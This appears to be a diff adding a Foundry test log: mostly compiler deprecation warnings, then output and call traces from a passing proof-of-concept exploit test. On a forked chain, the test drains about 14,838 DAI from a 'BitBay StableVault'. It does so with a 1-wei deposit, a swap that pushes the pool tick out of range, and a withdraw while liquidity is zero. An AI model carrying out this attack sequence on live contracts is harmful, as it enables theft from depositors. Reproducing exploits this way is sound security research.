+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2603:9:
+     |
+2603 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2623:9:
+     |
+2623 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2646:9:
+     |
+2646 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2664:9:
+     |
+2664 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2687:9:
+     |
+2687 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2705:9:
+     |
+2705 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2728:9:
+     |
+2728 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2748:9:
+     |
+2748 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2774:9:
+     |
+2774 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2796:9:
+     |
+2796 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2822:9:
+     |
+2822 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2844:9:
+     |
+2844 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2870:9:
+     |
+2870 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2892:9:
+     |
+2892 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2918:9:
+     |
+2918 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2942:9:
+     |
+2942 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2971:9:
+     |
+2971 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:2992:9:
+     |
+2992 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3007:9:
+     |
+3007 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3023:9:
+     |
+3023 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3038:9:
+     |
+3038 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3054:9:
+     |
+3054 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3069:9:
+     |
+3069 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3087:9:
+     |
+3087 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3112:9:
+     |
+3112 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3130:9:
+     |
+3130 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3145:9:
+     |
+3145 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3161:9:
+     |
+3161 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3176:9:
+     |
+3176 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3192:9:
+     |
+3192 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3207:9:
+     |
+3207 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3225:9:
+     |
+3225 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3250:9:
+     |
+3250 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3268:9:
+     |
+3268 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/BitBayStableVault_exp.sol:BitBayStableVaultExploit
+[PASS] testExploit() (gas: 1159578)
+Logs:
+  Attacker Before exploit DAI Balance: 0.000000000000000000
+  BitBay StableVault - liquidity==0 withdraw drains the whole vault to a 1-wei shareholder
+  vault tickLower: 276323
+  vault tickUpper: 276326
+  pool tick before: 276324
+  vault DAI before: 8.390192804782497678
+  pool tick after push swap: 276326
+  vault liquidity after reposition: 0
+  vault DAI idle after reposition (now drainable): 14838.466608989135865711
+  DAI drained by withdraw(1): 14838.466608989135865711
+  vault DAI after withdraw: 0.000000000000000000
+  Net DAI profit (final DAI - working capital): 14824.576943690080233925
+  Attacker After exploit DAI Balance: 124824.576943690080233925
+
+Traces:
+  [1290138] BitBayStableVaultExploit::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 95204941 [9.52e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::warp(1791512622 [1.791e9])
+    │   └─ ← [Return]
+    ├─ [1202646] → new BitBayExploiter@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 5770 bytes of code
+    └─ ← [Stop]
+
+  [1389778] BitBayStableVaultExploit::testExploit()
+    ├─ [8586] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::symbol() [staticcall]
+    │   ├─ [3226] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::symbol() [delegatecall]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000034441490000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000034441490000000000000000000000000000000000000000000000000000000000
+    ├─ [3418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [2564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3254] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::decimals() [staticcall]
+    │   ├─ [2406] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::decimals() [delegatecall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit DAI Balance", val: 0, decimals: 18)
+    ├─ emit log_string(val: "BitBay StableVault - liquidity==0 withdraw drains the whole vault to a 1-wei shareholder")
+    ├─ [16679] 0x048E88311ca84876aeA086125825492e2AF2e5A0::getBalances() [staticcall]
+    │   ├─ [3418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   ├─ [2564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   └─ ← [Return] 8390192804782497678 [8.39e18]
+    │   │   └─ ← [Return] 8390192804782497678 [8.39e18]
+    │   ├─ [9750] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   ├─ [2553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 8390192804782497678 [8.39e18], 0
+    ├─ [4632] 0x048E88311ca84876aeA086125825492e2AF2e5A0::getPosition() [staticcall]
+    │   └─ ← [Return] 276323 [2.763e5], 276326 [2.763e5], 98869777365041977456 [9.886e19]
+    ├─ [5946] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   ├─ [2375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   └─ ← [Return] 0x00000000003200d00d04376400000000000f426c2f4cbaa38f5c747e34a3a88f
+    │   └─ ← [Return] 79231663191970166433685612957771919 [7.923e34], 276324 [2.763e5], 53261 [5.326e4], 50
+    ├─ emit log_named_int(key: "vault tickLower", val: 276323 [2.763e5])
+    ├─ emit log_named_int(key: "vault tickUpper", val: 276326 [2.763e5])
+    ├─ emit log_named_int(key: "pool tick before", val: 276324 [2.763e5])
+    ├─ emit log_named_decimal_uint(key: "vault DAI before", val: 8390192804782497678 [8.39e18], decimals: 18)
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063)
+    │   └─ ← [Return] [0xbaab7dbf64751104133af04abc7d9979f0fda3b059a322a8333f533d3f32bf7f, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11], []
+    ├─ [0] VM::load(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, slot: 69393843706556739145208183207487664574148646921343583726290437754869064268305 [6.939e76])
+    ├─ [0] VM::load(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, fsig: 0x70a08231, keysHash: 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, slot: 69393843706556739145208183207487664574148646921343583726290437754869064268305 [6.939e76])
+    ├─ [0] VM::load(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, 0x00000000000000000000000000000000000000000000174b1ca8ab05a8c00000)
+    │   └─ ← [Return]
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 110000000000000000000000 [1.1e23]
+    │   └─ ← [Return] 110000000000000000000000 [1.1e23]
+    ├─ [766402] BitBayExploiter::deposit_and_push(1791512622 [1.791e9])
+    │   ├─ [25628] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::approve(0x048E88311ca84876aeA086125825492e2AF2e5A0, 1)
+    │   │   ├─ [24768] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::approve(0x048E88311ca84876aeA086125825492e2AF2e5A0, 1) [delegatecall]
+    │   │   │   ├─ emit Approval(owner: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x048E88311ca84876aeA086125825492e2AF2e5A0, value: 1)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x36904f5e4647ddb03c34bf97eebd8171f27813ad02a676990c6f4adb6dba0fa2: 0 → 1
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [607135] 0x048E88311ca84876aeA086125825492e2AF2e5A0::deposit(1, 1791512622 [1.791e9])
+    │   │   ├─ [10181] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transferFrom(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x048E88311ca84876aeA086125825492e2AF2e5A0, 1)
+    │   │   │   ├─ [9315] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transferFrom(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x048E88311ca84876aeA086125825492e2AF2e5A0, 1) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x048E88311ca84876aeA086125825492e2AF2e5A0, value: 1)
+    │   │   │   │   ├─ emit Approval(owner: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x048E88311ca84876aeA086125825492e2AF2e5A0, value: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x36904f5e4647ddb03c34bf97eebd8171f27813ad02a676990c6f4adb6dba0fa2: 1 → 0
+    │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0x000000000000000000000000000000000000000000000000746ff3e71e195f8e → 0x000000000000000000000000000000000000000000000000746ff3e71e195f8f
+    │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000174b1ca8ab05a8c00000 → 0x00000000000000000000000000000000000000000000174b1ca8ab05a8bfffff
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [90413] 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c::addShares(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
+    │   │   │   ├─ [3418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [2564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 25136040285016350971 [2.513e19]
+    │   │   │   │   └─ ← [Return] 25136040285016350971 [2.513e19]
+    │   │   │   ├─ [3250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [2553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 32159555 [3.215e7]
+    │   │   │   │   └─ ← [Return] 32159555 [3.215e7]
+    │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 25136040285016350971 [2.513e19]
+    │   │   │   │   └─ ← [Return] 25136040285016350971 [2.513e19]
+    │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 32159555 [3.215e7]
+    │   │   │   │   └─ ← [Return] 32159555 [3.215e7]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000000000000000002a9d8b4ebba568 → 0x000000000000000000000000000000000000000000000000002bdd338e1a901d
+    │   │   │   │   @ 0xd5ce871ae9021201bef81f6d37c125fcdeccbd336ebd825239acea6f95005c69: 0 → 1
+    │   │   │   │   @ 6: 0x000000000000000000000000000000000000000000000000000000000189177e → 0x0000000000000000000000000000000000000000000000000000000001eab743
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000032459afda1bfb97c00b → 0x00000000000000000000000000000000000000000000032459afda1bfb97c00c
+    │   │   │   │   @ 4: 13059 → 13490
+    │   │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000011475f7336beb8741 → 0x0000000000000000000000000000000000000000000000015cd52776784ee0fb
+    │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [466926] 0x67366782805870060151383F4BbFF9daB53e5cD6::unlock(0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   ├─ [464967] 0x048E88311ca84876aeA086125825492e2AF2e5A0::unlockCallback(0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376400000000000f426c2f4cbaa38f5c747e34a3a88f
+    │   │   │   │   │   └─ ← [Return] 79231663191970166433685612957771919 [7.923e34], 276324 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376400000000000f426c2f4cbaa38f5c747e34a3a88f
+    │   │   │   │   │   └─ ← [Return] 79231663191970166433685612957771919 [7.923e34], 276324 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [33173] 0x67366782805870060151383F4BbFF9daB53e5cD6::modifyLiquidity((0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 50, 1, 0x0000000000000000000000000000000000000000), (276323 [2.763e5], 276326 [2.763e5], 0, 0x0000000000000000000000000000000000000000000000000000000000000001), 0x)
+    │   │   │   │   │   ├─  emit topic 0: 0xf208f4912782fd25c7f114ca3723a2d5dd6f3bcc3ac8db5af63baa85f711d5ec
+    │   │   │   │   │   │        topic 1: 0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000048e88311ca84876aea086125825492e2af2e5a0
+    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000043763000000000000000000000000000000000000000000000000000000000004376600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xddf51250bda266bac01096983189b9134cd40848a7c6599656c30ffb872ec35a: 0x0000000000000000000000000000000587089475f69e643b7b0a2ea21076012d → 0x0000000000000000000000000000000598285fbb91ef25f5c0f4dddb53ba6f65
+    │   │   │   │   │   │   @ 0xddf51250bda266bac01096983189b9134cd40848a7c6599656c30ffb872ec359: 0x000000000000000000000000000000000000000006128ea4aa136d141d9d1c00 → 0x000000000000000000000000000000000000000006254b089e97630f58c2f5b8
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000646b6900000000000000005bc80091fafe172c00000000000000000000000000646b6900000000000000005bc80091fafe172c
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 8390192804782497679 [8.39e18]
+    │   │   │   │   │   └─ ← [Return] 8390192804782497679 [8.39e18]
